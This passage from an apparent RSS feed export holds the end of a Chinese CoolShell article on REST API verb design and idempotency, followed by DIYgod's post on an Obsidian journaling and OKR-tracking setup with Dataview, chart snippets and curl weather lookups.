alt=\"✔\">︎</td>\n</tr>\n<tr>\n<td>PUT</td>\n<td>用于所有的信息更新，对应于数据库的 <code>update </code>操作</td>\n<td><img src=\"https://s.w.org/images/core/emoji/14.0.0/72x72/2714.png\" alt=\"✔\">︎︎</td>\n</tr>\n<tr>\n<td>DELETE</td>\n<td>用于更新操作，对应于数据库的 <code>delete</code> 操作</td>\n<td><img src=\"https://s.w.org/images/core/emoji/14.0.0/72x72/2714.png\" alt=\"✔\">︎︎</td>\n</tr>\n<tr>\n<td>POST</td>\n<td>用于新增操作，对应于数据库的 <code>insert</code> 操作</td>\n<td>✘</td>\n</tr>\n<tr>\n<td>HEAD</td>\n<td>用于返回一个资源对象的“元数据”，或是用于探测API是否健康</td>\n<td><img src=\"https://s.w.org/images/core/emoji/14.0.0/72x72/2714.png\" alt=\"✔\">︎</td>\n</tr>\n<tr>\n<td>PATCH</td>\n<td>用于局部信息的更新，对应于数据库的 <code>update</code> 操作</td>\n<td>✘</td>\n</tr>\n<tr>\n<td>OPTIONS</td>\n<td>获取API的相关的信息。</td>\n<td><img src=\"https://s.w.org/images/core/emoji/14.0.0/72x72/2714.png\" alt=\"✔\">︎</td>\n</tr>\n</tbody>\n</table>\n<p>其中，<code>PUT</code> 和 <code>PACTH</code> 都是更新业务资源信息，如果资源对象不存在则可以新建一个，但他们两者的区别是，<code>PUT</code> 用于更新一个业务对象的所有完整信息，就像是我们通过表单提交所有的数据，而 <code>PACTH</code> 则对更为API化的数据更新操作，只需要更需要更新的字段（参看 <a href=\"http://tools.ietf.org/html/rfc5789\" rel=\"nofollow\">RFC 5789</a> ）。</p>\n<p>当然，现实世界中，可能并不一定严格地按照数据库操作的CRUD来理解API，比如，你有一个登录的API <code>/login</code> 你觉得这个API应该是 <code>GET</code> ，<code>POST</code>，<code>PUT</code> 还是 <code>PATCH</code> ?登录的时候用户需要输入用户名和密码，然后跟数据库里的对比（select操作）后反回一个登录的session token，然后这个token作为用户登录的状态令牌。如果按上面表格来说，应该是 select 操作进行 <code>GET</code> ，但是从语义上来说，登录并不是查询信息，应该是用户状态的更新或是新增操作（新增session），所以还是应该使用 <code>POST</code>，而 <code>/logout</code> 你可以使用 <code>DELETE</code> 。<strong>这里相说明一下，不要机械地通过数据库的CRUD来对应这些动词，很多时候，还是要分析一下业务语义。</strong></p>\n<p><strong>另外，我们注意到，在这个表格的最后一列中加入了“是否幂等”的，API的幂等对于控制逻辑来说是一件很重要的事。</strong>所谓幂等，就是该API执行多次和执行一次的结果是完全一样的，没有副作用。</p>\n<ul>\n<li><code>POST</code> 用于新增加数据，比如，新增一个交易订单，这肯定不能是幂等的</li>\n<li><code>DELETE</code> 用于删除数据，一个数据删除多次和删除一次的结果是一样的，所以，是幂等的</li>\n<li><code>PUT</code> 用于全部数更新，所以，是幂等的。</li>\n<li><code>PATCH</code>用于局部更新，比如，更新某个字段 cnt = cnt+1，明显不可能是幂等操作。</li>\n</ul>\n<p>幂等这个特性对于远程调用是一件非常关键的事，就是说，远程调用有很多时候会因为网络原因导致调用timeout，对于timeout的请求，我们是无法知道服务端是否已经是收到请求并执行了，此时，我们不能贸然重试请求，对于不是幂等的调用来说，这会是灾难性的。比如像转帐这样的业务逻辑，转一次和转多次结果是不一样的，如果重新的话有可能就会多转了一次。所以，这个时候，如果你的API遵从了HTTP动词的规范，那么你写起程序来就可以明白在哪些动词下可以重试，而在哪些动词下不能重试。如果你把所有的API都用POST来表达的话，就完全失控了。</p>\n<p>除了幂等这样的控制逻辑之外，你可能还会有如下的这些控制逻辑的需求：</p>\n<ul>\n<li><strong>缓存</strong>。通过CDN或是网关对API进行缓存，很显然，我们要在查询<code>GET</code> 操作上建议缓存。</li>\n<li><strong>流控</strong>。你可以通过HTTP的动词进行更粒度的流控，比如：限制API的请用频率，在读操作上和写操作上应该是不一样的。</li>\n<li><strong>路由</strong>。比如：写请求路由到写服务上，读请求路由到读服务上。</li>\n<li><strong>权限</strong>。可以获得更细粒度的权限控制和审计。</li>\n<li><strong>监控</strong>。因为不同的方法的API的性能都不一样，所以，可以区分做性能分析。</li>\n<li><strong>压测</strong>。当你需要压力测试API时，如果没有动词的区分的话，我相信你的压力测试很难搞吧。</li>\n<li>……等等</li>\n</ul>\n<p>也许，你会说，我的业务太简单了，没有必要搞这么复杂。OK，没有问题，但<strong>是我觉得你最差的情况下，也是需要做到“读写分离”的，就是说，至少要有两个动词，<code>GET</code> 表示是读操作，<code>POST</code>表示是写操作。</strong></p>\n<h4>Restful 复杂查询</h4>\n<p>一般来说，对于查询类的API，主要就是要完成四种操作：排序，过滤，搜索，分页。下面是一些相关的规范。参考于两个我觉得写的最好的Restful API的规范文档，<a href=\"https://github.com/microsoft/api-guidelines/blob/vNext/Guidelines.md\" target=\"_blank\" rel=\"noopener\">Microsoft REST API Guidelines</a>，<a href=\"https://github.com/paypal/api-standards/blob/master/api-style-guide.md\" target=\"_blank\" rel=\"noopener\">Paypal API Design Guidelines</a>。</p>\n<ul dir=\"auto\">\n<li>\n<p dir=\"auto\"><strong>排序</strong>。对于结果集的排序，使用 <code>sort</code> 关键字，以及 <code>{field_name}|{asc|desc},{field_name}|{asc|desc}</code> 的相关语法。比如，某API需要返回公司的列表，并按照某些字段排序，如：<code>GET /admin/companies?sort=rank|asc</code> 或是 <code>GET /admin/companies?sort=rank|asc,zip_code|desc</code></p>\n</li>\n<li>\n<p dir=\"auto\"><strong>过滤</strong>。对于结果集的过滤，使用 <code>filter</code> 关键字，以及 <code>{field_name} op{value}</code> 的语法。比如： <code>GET /companies?category=banking&amp;location=china</code> 。但是，有些时候，我们需要更为灵活的表达式，我们就需要在URL上构造我们的表达式。这里需要定义六个比较操作：<code>=</code>，<code>&lt;</code>，<code>&gt;</code>，<code>&lt;=</code>，<code>&gt;=</code>，以及三个逻辑操作：<code>and</code>，<code>or</code>，<code>not</code>。（表达式中的一些特殊字符需要做一定的转义，比如：<code>&gt;=</code> 转成 <code>ge</code>）于是，我们就会有如下的查询表达式：<code>GET /products?$filter=name eq 'Milk' and price lt 2.55</code> 查找所有的价柗小于2.55的牛奶。</p>\n</li>\n<li>\n<p dir=\"auto\"><strong>搜索</strong>。对于相关的搜索，使用 <code>search</code> 关键字，以及关键词。如：<code>GET /books/search?description=algorithm</code> 或是直接就是全文搜索 <code>GET /books/search?key=algorithm</code> 。</p>\n</li>\n<li>\n<p dir=\"auto\"><strong>分页</strong>。对于结果集进行分页处理，分页必需是一个默认行为，这样不会产生大量的返回数据。</p>\n<ul dir=\"auto\">\n<li>使用<code>page</code>和<code>per_page</code>代表页码和每页数据量，比如：<code>GET /books?page=3&amp;per_page=20</code>。</li>\n<li><strong>可选</strong>。上面提到的<code>page</code>方式为使用相对位置来获取数据，可能会存在两个问题：性能（大数据量）与数据偏差（高频更新）。此时可以使用绝对位置来获取数据：事先记录下当前已获取数据里最后一条数据的<code>ID</code>、<code>时间</code>等信息，以此获取 “<strong>该ID之前的数据</strong>” 或 “<strong>该时刻之前的数据</strong>”。示例：<code>GET /news?max_id=23454345&amp;per_page=20</code> 或 <code>GET /news?published_before=2011-01-01T00:00:00Z&amp;per_page=20</code>。</li>\n</ul>\n</li>\n</ul>\n<p>另外，对于一些更为复杂的操作，建议通过分别调用多个API的方式来完成，虽然这样会增加网络请求的次数，但是这样的可以让后端程序和数据耦合度更小，更容易成为微服务的架构。</p>\n<p>最后，如果你想在Rest中使用像GraphQL那样的查询语言，你可以考虑一下类似 <a href=\"https://www.odata.org/\" target=\"_blank\" rel=\"noopener\">OData</a> 的解决方案。OData 是 Open Data Protocol 的缩写，最初由 Microsoft 于 2007 年开发。它是一种开放协议，使您能够以简单和标准的方式创建和使用可查询和可互操作的 RESTful API。</p>\n<h4>几个主要问题的回应</h4>\n<p>下面是对几个问题的直接回应，如果大家需要我回应更多的问题，可以在后面留言，我会把问题和我的回应添加到下面。</p>\n<h5>1）为什么API 要Restful，并符合规范？</h5>\n<p><strong>Restful API算是一个HTTP的规范和标准了，你要说是最佳实践也好，总之，它是一个全世界对HTTP API的一个共识。在这个共识上，你可以无成本地享受很多的技术红利，比如：CDN，API网关，服务治理，监控……等等。这些都是可以让你大幅度降低研发成本，避免踩坑的原因。</strong></p>\n<h5>2）为什么“过早优化”不适用于API设计？</h5>\n<p>因为API是一种契约，一旦被使用上，就很难再变更了，就算你发行新的版本的API，你还要驱动各种调用方升级他们的调用方式。所以，接口设计就像数据库模式设计一下，一旦设计好了，未来再变更就比较难了。所以，还是要好好设计。正如前面我给的几个文档——<a href=\"https://github.com/microsoft/api-guidelines/blob/vNext/Guidelines.md\" target=\"_blank\" rel=\"noopener\">Microsoft REST API Guidelines</a>，<a href=\"https://github.com/paypal/api-standards/blob/master/api-style-guide.md\" target=\"_blank\" rel=\"noopener\">Paypal API Design Guidelines</a> 或是 <a href=\"https://cloud.google.com/apis/design\" target=\"_blank\" rel=\"noopener\">Google API Design Guide</a> 都是让你好好设计API的不错的 Guidelines.</p>\n<h5>3）POST 更安全吗？</h5>\n<p>不会。</p>\n<p>很多同学以为 <code>GET</code> 的请求数据在URL中，而 <code>POST</code> 的则不是，所以以为 <code>POST</code> 更安全。不是这样的，整个请求的HTTP URL PATH会全部封装在HTTP的协议头中。只要是HTTPS，就是安全的。当然，有些网关如nginx会把URL打到日志中，或是会放在浏览器的历史记录中，所以有人会说 <code>GET</code> 请求不安全，但是，<code>POST</code> 也没有好到哪里去，在 <a href=\"https://en.wikipedia.org/wiki/Cross-site_request_forgery\" target=\"_blank\" rel=\"noopener\">CSRF</a> 这个最常见的安全问题上，则完全就是针对 <code>POST</code> 的。  安全是一件很复杂的事，无论你用哪方法或动词都会不能代表你会更安全。</p>\n<p>另外，</p>\n<h5>4）全用 POST 可以节省时间减少沟通吗？</h5>\n<p>不但不会，反而更糟糕。</p>\n<p>说这种话的人，我感觉是不会思考问题。</p>\n<ul>\n<li>其一，为API赋于不同的动词，这个几乎不需要时间。把CRUD写在不同的函数下也是一种很好的编程风格。另外现在几乎所有的开发框架都支持很快速的CRUD的开发，比如Spring Boot，写数据库的CRUD基本上就不需要写SQL语言相关的查询代码，非常之方便。</li>\n<li>其二，使用规范的方式，可以节约新加入团队人员的学习成本，而且可以大大减少跨团队的沟能成本。规范和标准其实就是在节约团队时间提升整体效率的，这个我们整个人类进行协作的基础。所以，这个世界上有很多的标准，你只要照着这个标准来，你的所生产的零件就可以适配到其它厂商的产品上。而不需要相互沟通。</li>\n<li>萁三，全用POST接口一把梭，不规范不标准，使用你的这个山寨API的人就得来不断的问你，反而增加了沟通。另外，也许你开发业务功能很快了，但是你在做控制逻辑的时候，你就要返工了，从长期上来讲，你的欠下了技术债，这个债反而导致了更大的成本。</li>\n</ul>\n<h5>5）早点回家的正确姿势</h5>\n<p>不要以为你回家早就没事了，如果你的代码有这样那样的问题，别人看懂，或是出误用了你的代码出了问题，那么，你早回家有什么意义呢？你一样要被打扰，甚至被叫到公司来处理问题。所以，你应该做的是为了“长期的早回家”，而不是“短期的早回家”，要像长期的早回家，通常来说是这样的：</p>\n<ul>\n<li><strong>把代码组织设计好，有更好的扩展性</strong>。这样在面对新需求的时候，你就可以做到少改代码，甚至不改代码。这样你才可能早回家。不然，每次需求一来，你得重新写，你怎么可能早回家？</li>\n<li><strong>你的代码质量是不错的，有不错的文档和注释</strong>。所以，别人不会老有问题来找你，或是你下班后，叫你来处理问题。甚至任何人都可以很容易地接手你的代码，这样你才可能真正不被打扰</li>\n</ul>\n<h5>6）工作而已，优雅不能当饭吃</h5>\n<p>回应两点：</p>\n<p>其一，遵循个规范而已，把“正常”叫“优雅”，可见标准有多低。这么低的标准也只能“为了吃饭而生存了”。</p>\n<p>其二，<strong>作为一个“职业程序员”，要学会热爱和尊重自己的职业，热爱自己职业最重要的就是不要让外行人看扁这个职业，自己都不尊重这个职业，你让别人怎么尊重？尊重自己的职业，不仅仅只是能够获得让人羡慕的报酬，而更是要让自己的这个职业的更有含金量</strong>。</p>\n<p><strong>希望大家都能尊重自己从事的这个职业，成为真正的职业化的程序员，而不是一个码农！</strong></p>\n<figure aria-describedby=\"caption-attachment-22177\"><img loading=\"lazy\" src=\"https://coolshell.cn/wp-content/uploads/2022/02/quote-your-job-gives-you-authority-your-behavior-gives-you-respect-irwin-federman-73-55-75.jpeg\" alt=\"\" width=\"834\" height=\"319\"><figcaption>你的工作给你权力，而只有你的行为才会给你尊重</figcaption></figure>\n<p>（全文完）</p>\n<p align=\"center\"><img src=\"https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg\"> <img loading=\"lazy\" src=\"https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg\" width=\"300\" height=\"300\"> <br>关注CoolShell微信公众账号和微信小程序</p>\n<div>\n<p align=\"center\"><strong>（转载本站文章请注明作者和出处 <a href=\"https://coolshell.cn/\">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>\n</div>\n<div>——=== <b>访问 <a href=\"http://coolshell.cn/404/\" target=\"_blank\">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>\n\n<div><div><h3>相关文章</h3><ul><li><a href=\"https://coolshell.cn/articles/22157.html\"><img src=\"https://coolshell.cn/wp-content/uploads/2022/02/monitoring-150x150.jpeg\" alt=\"谈谈公司对员工的监控\" width=\"150\" height=\"150\"></a><a href=\"https://coolshell.cn/articles/22157.html\">谈谈公司对员工的监控</a></li><li><a href=\"https://coolshell.cn/articles/21589.html\"><img src=\"https://coolshell.cn/wp-content/uploads/2021/07/knowledge_sharing-300x169-1-150x150.jpeg\" alt=\"如何做一个有质量的技术分享\" width=\"150\" height=\"150\"></a><a href=\"https://coolshell.cn/articles/21589.html\">如何做一个有质量的技术分享</a></li><li><a href=\"https://coolshell.cn/articles/20977.html\"><img src=\"https://coolshell.cn/wp-content/uploads/2020/08/programmer.01-e1596792460687-150x150.png\" alt=\"程序员如何把控自己的职业\" width=\"150\" height=\"150\"></a><a href=\"https://coolshell.cn/articles/20977.html\">程序员如何把控自己的职业</a></li><li><a href=\"https://coolshell.cn/articles/20765.html\"><img src=\"https://coolshell.cn/wp-content/uploads/2020/01/remote-150x150.jpg\" alt=\"MegaEase的远程工作文化\" width=\"150\" height=\"150\"></a><a href=\"https://coolshell.cn/articles/20765.html\">MegaEase的远程工作文化</a></li><li><a href=\"https://coolshell.cn/articles/20276.html\"><img src=\"https://coolshell.cn/wp-content/uploads/2019/12/open-your-creative-mind-150x150.jpg\" alt=\"别让自己“墙”了自己\" width=\"150\" height=\"150\"></a><a href=\"https://coolshell.cn/articles/20276.html\">别让自己“墙”了自己</a></li><li><a href=\"https://coolshell.cn/articles/19612.html\"><img src=\"https://coolshell.cn/wp-content/uploads/2019/07/1920px-Margaret_Hamilton_-_restoration-e1563697198766-1-150x150.jpg\" alt=\"50年前的登月程序和程序员有多硬核\" width=\"150\" height=\"150\"></a><a href=\"https://coolshell.cn/articles/19612.html\">50年前的登月程序和程序员有多硬核</a></li></ul></div></div>The post <a href=\"https://coolshell.cn/articles/22173.html\">“一把梭：REST API 全用 POST”</a> first appeared on <a href=\"https://coolshell.cn/\">酷 壳 - CoolShell</a>."
    },
    "origin": {
        "streamId": 10,
        "title": "酷壳",
        "htmlUrl": "https://coolshell.cn/",
        "feedUrl": "https://coolshell.cn/feed"
    }
},
{
    "id": "https://diygod.me/obsidian/",
    "timestampUsec": "1657679071252069",
    "categories": [
        "分享境",
        "user/-/state/com.google/read",
        "user/-/label/笔记系统"
    ],
    "title": "基于 Obsidian 的生活记录系统",
    "author": ";DIYgod",
    "published": 1657390980,
    "updated": 1657390980,
    "alternate": [
        {
            "href": "https://diygod.me/obsidian/",
            "type": "text/html"
        }
    ],
    "content": {
        "content": "<p>正如我在 <a href=\"https://diygod.me/2020\">2020 年终总结</a> 中提到，我一直在用 Notion 写子弹笔记，现在它有了亿点点不一样，现在我们就来重新窥探一下我目前的生活记录系统</p><p><strong>日记</strong><br><img src=\"https://diygod.me/images/obsidian-1.png\"></p><span></span><p><strong>周记</strong>和<strong>月记</strong><br><img src=\"https://diygod.me/images/obsidian-8.png\"></p><p><strong>年记</strong><br><img src=\"https://diygod.me/images/obsidian-9.png\"></p><p>原 Notion 子弹笔记<br><img src=\"https://diygod.me/images/2020-1.jpg\" width=\"50%\"></p><p>受益于 Obsidian 强大的自动化能力和极高的自由度，日/周/月/年笔记通过预设模板自动生成，互相联动，需要手动处理的部分很少</p><p>全部文件已上传至 GitHub：<a href=\"https://github.com/DIYgod/DIYgod-Obsidian-Starter\">https://github.com/DIYgod/DIYgod-Obsidian-Starter</a>，包括主题、插件、配置文件、自己定制的样式、模板文件、示例文件等，只是作为一个示例，请根据自己实际情况修改</p><p>这些东西乍一看是有一些复杂，但其实用起来很简单，自由度和可扩展性也很强，下面我来详细介绍</p><h2><a href=\"https://diygod.me/#%E7%BB%93%E6%9E%84\" title=\"结构\"></a>结构</h2><p>目录结构如日记图左侧栏所示</p><figure><table><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br></pre></td><td><pre><span>├── OKR.md</span><br><span>└── Journal</span><br><span>    └── 2022</span><br><span>        ├── W1</span><br><span>        |   └── 2022-01-01.md</span><br><span>        |   └── 2022-W1.md</span><br><span>        ├── 2022-01.md</span><br><span>        └── 2022.md</span><br></pre></td></tr></table></figure><p>每天会自动在本周的文件夹中生成当天的日记文件 <code>YYYY-MM-DD.md</code>，每周会自动新建一个周文件夹 <code>[W]ww</code> 和周记 <code>YYYY-[W]ww.md</code>，每月会自动生成月记 <code>YYYY-MM.md</code>，每年会自动新建一个年文件夹 <code>YYYY</code> 和年记 <code>YYYY.md</code>（更正：不是自动，仍然需要命令面板手动触发）</p><p>这些文件的内容也都是模板预设好的，已经自动填充了日期、本周期 OKR 分数和图表，甚至当天的位置、天气、月相等信息，还留出了记录当天状态和动态的位置</p><p>外面有一个 OKR 文件，大概半年更新一次，里面记录这半年的人生目标，其中有一些目标是需要每天持续努力的，日记系统的很大部分就是围绕这些目标来构建的</p><p>目录结构主要通过 <a href=\"https://github.com/liamcain/obsidian-periodic-notes\">Periodic Notes</a> 实现，模板主要通过 <a href=\"https://github.com/SilentVoid13/Templater\">Templater</a> 和 <a href=\"https://github.com/blacksmithgu/obsidian-dataview\">Dataview</a> 和核心插件 Templates 实现</p><h2><a href=\"https://diygod.me/#%E6%97%A5%E8%AE%B0\" title=\"日记\"></a>日记</h2><p><img src=\"https://diygod.me/images/obsidian-1.png\"></p><h3><a href=\"https://diygod.me/#Info\" title=\"Info\"></a>Info</h3><p>Info 是自动生成的当天信息，包括指向年月周记和 OKR 的链接，位置、天气、月相等信息</p><p>位置、天气、月相信息来自 Templater 的调用系统命令功能</p><p>获取位置和天气</p><figure><table><tr><td><pre><span>1</span><br></pre></td><td><pre><span>curl wttr.in/<span>\"<span>$(curl -s --header <span>\"user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36\"</span> https://api.ip.sb/geoip | /opt/homebrew/bin/jq -r <span>\".city\"</span> | sed 's/ /%20/')</span>\"</span>\\?format=<span>\"%l+%c%t\"</span></span><br></pre></td></tr></table></figure><p>获取月相</p><figure><table><tr><td><pre><span>1</span><br></pre></td><td><pre><span>curl wttr.in/<span>\"<span>$(curl -s --header <span>\"user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36\"</span> https://api.ip.sb/geoip | /opt/homebrew/bin/jq -r <span>\".city\"</span> | sed 's/ /%20/')</span>\"</span>\\?format=<span>\"%m\"</span></span><br></pre></td></tr></table></figure><h3><a href=\"https://diygod.me/#OKR-Tracker\" title=\"OKR Tracker\"></a>OKR Tracker</h3><p>OKR Tracke 跟踪记录当天当前阶段的 OKR 完成状况，比如 <code>Sleep:: 10.3</code> 代表今天睡了 10.3 小时，<code>Healthy Eating:: 5</code> 代表今天吃得很健康，<code>::</code> 是 Dataview 语法，会给当前页面增加</p><figure><table><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br></pre></td><td><pre><span>page = {</span><br><span>    ...</span><br><span>    <span>\"Sleep\"</span>: <span>10.3</span>,</span><br><span>    <span>\"Healthy Eating\"</span>: <span>5</span>,</span><br><span>}</span><br></pre></td></tr></table></figure><p>这样的属性，方便接下来在周月年记中做分析和处理</p><p>其中 O1 KR2 下有一个特殊的列表，通过 API 展示了当天 Toggl Track 数据， Toggl Track 是一个时间记录应用，记录我每天在各项事务中花费的时间，比如看番时间、刷B站时间、工作时间等，这些数据同样可以反映我今天的生产力是否符合预期</p><h3><a href=\"https://diygod.me/#Notes\" title=\"Notes\"></a>Notes</h3><p>这里是真正写日记的地方，多数是一些流水账，来弥补我天生糟糕的记忆力，偶尔也会写一些想法</p><h2><a href=\"https://diygod.me/#%E5%91%A8%E8%AE%B0%E5%92%8C%E6%9C%88%E8%AE%B0\" title=\"周记和月记\"></a>周记和月记</h2><p><img src=\"https://diygod.me/images/obsidian-8.png\"></p><h3><a href=\"https://diygod.me/#Jornal-List\" title=\"Jornal List\"></a>Jornal List</h3><p>Jornal List 是自动生成的本周/月全部日记的列表，通过 Dataview 实现</p><p>获取全部日记</p><figure><table><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br></pre></td><td><pre><span><span>// Week</span></span><br><span><span>window</span>.<span>pages</span> = dv.<span>pages</span>(<span>`\"<span>${dv.current().file.folder}</span>\"`</span>).<span>where</span>(<span><span>p</span> =&gt;</span> p.<span>file</span>.<span>name</span>.<span>match</span>(<span>new</span> <span>RegExp</span>(<span>`<span>${dv.current().file.name.split(<span>'-'</span>)[<span>0</span>]}</span>-\\\\d{2}-\\\\d{2}`</span>))).<span>sort</span>(<span><span>p</span> =&gt;</span> p.<span>file</span>.<span>name</span>);</span><br><span></span><br><span><span>// Month</span></span><br><span><span>window</span>.<span>pages</span> = dv.<span>pages</span>().<span>where</span>(<span><span>p</span> =&gt;</span> p.<span>file</span>.<span>name</span>.<span>match</span>(<span>new</span> <span>RegExp</span>(<span>`<span>${dv.current().file.name}</span>-\\\\d{2}`</span>))).<span>sort</span>(<span><span>p</span> =&gt;</span> p.<span>file</span>.<span>name</span>);</span><br></pre></td></tr></table></figure><p>渲染列表</p><figure><table><tr><td><pre><span>1</span><br></pre></td><td><pre><span>dv.<span>paragraph</span>(<span>window</span>.<span>pages</span>.<span>file</span>.<span>link</span>.<span>join</span>(<span>', '</span>))</span><br></pre></td></tr></table></figure><h3><a href=\"https://diygod.me/#Summary\" title=\"Summary\"></a>Summary</h3><p>这里是月末做总结和反思的地方，对应日记里的 Notes</p><h3><a href=\"https://diygod.me/#OKR-Tracker-1\" title=\"OKR Tracker\"></a>OKR Tracker</h3><p>在这里处理和分析全部日记里的 OKR 数据，最后生成分数，对应日记里的 OKR Tracker</p><p>它通过 Dataview 实现，以睡眠为例，≥ 6.5 小时且 ≤ 8.5 小时计为有效睡眠，有效睡眠天数占总天数的百分比即为得分</p><figure><table><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br></pre></td><td><pre><span><span>let</span> count = <span>0</span>;</span><br><span><span>let</span> total = <span>0</span>;</span><br><span><span>for</span> (<span>let</span> page <span>of</span> <span>window</span>.<span>pages</span>) {</span><br><span>    <span>if</span> (page[<span>'Sleep'</span>]) {</span><br><span>        count++;</span><br><span>        <span>if</span> (page[<span>'Sleep'</span>] &gt;= <span>6.5</span> &amp;&amp; page[<span>'Sleep'</span>] &lt;= <span>8.5</span>) {</span><br><span>            total++;</span><br><span>        }</span><br><span>    }</span><br><span>}</span><br><span><span>const</span> score = (total / count * <span>100</span>).<span>toFixed</span>(<span>2</span>);</span><br><span>dv.<span>el</span>(<span>'div'</span>, score + <span>'%'</span>, {</span><br><span>    <span>cls</span>: score &gt; <span>80</span> ? <span>'score-class1'</span> : score &gt; <span>50</span> ? <span>'score-class2'</span> : <span>'score-class3'</span></span><br><span>});</span><br></pre></td></tr></table></figure><p>再自己加一点 CSS，&gt; 80 分显示为绿色，50-80 分显示为黄色，&lt; 50 分显示为红色，这样就可以很清楚看出本周/月的睡觉情况，图里是黄色区间，不太好但还可以接受，下个月需要多留意</p><h3><a href=\"https://diygod.me/#Statistics\" title=\"Statistics\"></a>Statistics</h3><p>在这里把睡眠和运动数据生成统计图，可以清楚看出睡眠时长还是挺不稳定的，运动天数和时长都很少</p><p>统计图通过 <a href=\"https://github.com/phibr0/obsidian-charts\">Obsidian Charts</a> 绘制，睡眠统计图代码如下</p><figure><table><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br></pre></td><td><pre><span><span>const</span> times = [];</span><br><span><span>for</span> (<span>let</span> page <span>of</span> <span>window</span>.<span>pages</span>) {</span><br><span>    times.<span>push</span>(page[<span>'Sleep'</span>]);</span><br><span>}</span><br><span></span><br><span><span>const</span> chartData = {</span><br><span>    <span>type</span>: <span>'line'</span>,</span><br><span>    <span>data</span>: {</span><br><span>        <span>labels</span>: <span>window</span>.<span>pages</span>.<span>file</span>.<span>name</span>.<span>array</span>(),</span><br><span>        <span>datasets</span>: [{</span><br><span>            <span>label</span>: <span>'Sleep Time'</span>,</span><br><span>            <span>data</span>: times,</span><br><span>            <span>pointBackgroundColor</span>: <span>'#6c40d6'</span>,</span><br><span>            <span>borderColor</span>: <span>'#6c40d65c'</span>,</span><br><span>            <span>tension</span>: <span>0.4</span>,</span><br><span>            <span>spanGaps</span>: <span>true</span>,</span><br><span>        }],</span><br><span>    },</span><br><span>    <span>options</span>: {</span><br><span>        <span>scales</span>: {</span><br><span>            <span>y</span>: {</span><br><span>                <span>type</span>: <span>'linear'</span>,</span><br><span>                <span>min</span>: <span>2</span>,</span><br><span>                <span>max</span>: <span>13</span></span><br><span>            }</span><br><span>        }</span><br><span>    }</span><br><span>}</span><br><span></span><br><span><span>window</span>.<span>renderChart</span>(chartData, <span>this</span>.<span>container</span>);</span><br></pre></td></tr></table></figure><h3><a href=\"https://diygod.me/#Finance\" title=\"Finance\"></a>Finance</h3><p>本月的财务数据饼状图，通过 MoneyWiz 生成</p><h2><a href=\"https://diygod.me/#%E5%B9%B4%E8%AE%B0\" title=\"年记\"></a>年记</h2><p><img src=\"https://diygod.me/images/obsidian-9.png\"></p><p>年记与周记月记相似度也很高，但通过扩大时间尺度，可以得出很多新的有用结论</p><p>比如同样的睡眠和运动统计图，在年的尺度里就可以看出我是在 5 月底睡眠开始失控，在这期间运动也中断了，又从 6 月中旬得到缓解</p><p>还有新的体重体脂统计图，可以看出我的体重和体脂都在稳步下降，健康状况有明显改善</p><p>年记还出现了新的一种热图，记录达到目标的日子，通过 <a href=\"https://github.com/Richardsl/heatmap-calendar-obsidian\">Heatmap Calendar</a> 绘制，以睡眠为例</p><figure><table><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br></pre></td><td><pre><span><span>const</span> calendarData = { </span><br><span>    <span>entries</span>: [],</span><br><span>}</span><br><span></span><br><span><span>const</span> pages = <span>window</span>.<span>pages</span></span><br><span>    .<span>where</span>(<span><span>p</span> =&gt;</span> p.<span>Sleep</span> &amp;&amp; p.<span>Sleep</span> &gt;= <span>6.5</span> &amp;&amp; p.<span>Sleep</span> &lt;= <span>8.5</span>)</span><br><span>    .<span>sort</span>(<span><span>p</span> =&gt;</span> p.<span>file</span>.<span>name</span>);</span><br><span></span><br><span><span>for</span>(<span>let</span> page <span>of</span> pages){ </span><br><span>    calendarData.<span>entries</span>.<span>push</span>({</span><br><span>        <span>date</span>: page.<span>file</span>.<span>name</span>,</span><br><span>        <span>intensity</span>: page.<span>Sleep</span>,</span><br><span>    })</span><br><span>}</span><br><span></span><br><span><span>renderHeatmapCalendar</span>(<span>this</span>.<span>container</span>, calendarData);</span><br></pre></td></tr></table></figure><h2><a href=\"https://diygod.me/#%E5%B1%80%E9%99%90\" title=\"局限\"></a>局限</h2><p>子弹笔记有一个很重要的任务清单模块，如上面子弹笔记截图所示，我之前会把一周的任务清单都提前写在笔记里，但现在日记都是当天自动生成，无法提前计划，所以我把任务清单都改用了滴答清单来管理，滴答清单当然也很好用，但是这样就少了与日记的联动，手动添加又会造成很多重复工作，就不是很爽</p><p>最后需要注意的是，即使有这样的生活管理系统也不意味着生活就会一切按照预期，就像上面举例的 5 月底睡眠失控事件，一旦放松失控仍会发生，笔记会告诉我生活正在失控，但如何回到正轨和追赶上 OKR 还是要靠自控力和坚持的定期总结、反思和改进</p>"
    },
    "origin": {
        "streamId": 11,
        "title": "DIYgod",
        "htmlUrl": "https://diygod.me/",
        "feedUrl": "https://diygod.me/atom.xml"
    }
},
{
    "id": "https://www.yinwang.org/blog-cn/2013/03/04/braid",
